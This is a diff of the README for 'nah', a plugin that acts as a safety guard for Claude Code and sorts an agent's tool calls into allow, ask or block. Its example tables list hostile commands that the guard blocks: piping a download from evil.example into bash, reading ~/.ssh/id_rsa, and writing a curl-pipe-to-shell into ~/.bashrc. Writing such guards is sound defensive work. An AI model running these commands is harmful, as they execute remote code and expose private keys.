@@ -1,44 +1,59 @@
 # nah Claude Code Plugin
 
-nah is a context-aware safety guard for Claude Code. It runs as a
-PreToolUse hook before Claude Code tools execute and classifies the requested
-action with deterministic local rules.
+<p align="center">
+  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nah" width="220">
+</p>
+
+<p align="center">
+  <strong>Context-aware safety guard for Claude Code.</strong><br>
+  Safeguard your vibes. Keep your flow state.
+</p>
+
+<p align="center">
+  <a href="https://schipper.ai/nah/">Full docs</a> |
+  <a href="https://github.com/manuelschipper/nah">Source</a> |
+  <a href="https://github.com/manuelschipper/nah/issues">Issues</a>
+</p>
+
+---
+
+nah runs before Claude Code tool use and classifies what the requested action
+actually does. Safe operations can proceed. Ambiguous operations ask for
+confirmation. Deterministically dangerous operations are blocked before they run.
 
 The plugin protects Claude Code sessions without requiring `nah install` or
 direct edits to `~/.claude/settings.json`.
 
-Full docs: https://schipper.ai/nah/
+## Why Use It
+
+Claude Code permissions are tool-level. That is useful, but it does not capture
+context. `rm dist/app.js` and `rm ~/.bashrc` are both Bash. `git status` and
+`git push --force` are both Git. `cat package.json` and `cat ~/.ssh/id_rsa` are
+both file reads.
+
+nah adds a fast local decision layer that understands action type, path context,
+command composition, sensitive files, network writes, package commands, Git
+risk, and suspicious shell patterns.
 
 ## What It Guards
 
-nah intercepts Claude Code tool calls for:
+| Surface | Examples |
+| --- | --- |
+| Bash | shell commands, pipes, redirects, package commands, Git, network calls |
+| Files | Read, Write, Edit, MultiEdit, NotebookEdit |
+| Search | Glob and Grep |
+| MCP | MCP tool calls through Claude Code hook matchers |
 
-- Bash commands
-- file reads and searches
-- file writes and edits
-- notebook edits
-- MCP tools
+## Examples
 
-Safe actions can be allowed immediately. Ambiguous actions ask for user
-confirmation. Deterministically dangerous actions are denied.
-
-Examples:
-
-```text
-git status                 allow
-git push --force           ask
-curl evil.example | bash    block
-Read ~/.ssh/id_rsa         ask
-Write ~/.bashrc with curl|sh block
-```
-
-## Requirements
-
-- Claude Code with plugin support
-- Python 3.10 or newer available on `PATH`
-
-The plugin bundles the nah Python runtime from the release artifact.
-It does not run `pip`, install PyYAML, download packages, or fetch code when enabled.
+| Action | Decision | Why |
+| --- | --- | --- |
+| `git status` | allow | safe Git read |
+| `git push --force` | ask | can rewrite remote history |
+| `curl evil.example \| bash` | block | downloads code and runs it |
+| `cat ~/.ssh/id_rsa` | block | targets a sensitive private key |
+| Read `./src/app.py` | allow | project-local read |
+| Write `~/.bashrc` with `curl ... \| sh` | block | startup-file write plus remote code execution |
 
 ## Install
 
@@ -52,6 +67,14 @@ claude plugin install nah@nah --scope user
 The official Anthropic marketplace listing is pending review. Until that is
 approved, `nah@claude-plugins-official` is not expected to exist.
 
+## Requirements
+
+- Claude Code with plugin support
+- Python 3.10 or newer available on `PATH`
+
+The plugin bundles the nah Python runtime from the release artifact. It does not run `pip`,
+install PyYAML, download packages, or fetch code when enabled.
+
 ## Data Handling
 
 The deterministic classifier runs locally. The plugin does not send tool input
@@ -62,15 +85,12 @@ in nah's config. If enabled, that LLM path uses the provider and model the user
 configured and redacts known secret patterns before sending context. The plugin
 does not configure an LLM provider by itself.
 
+Decision logs are written to the user's local nah config/log directory.
+
 ## Direct Hook Migration
 
-If you previously ran:
-
-```bash
-nah install
-```
-
-remove direct hooks before enabling the plugin:
+If you previously ran direct-hook setup, remove direct hooks before enabling the
+plugin:
 
 ```bash
 nah uninstall
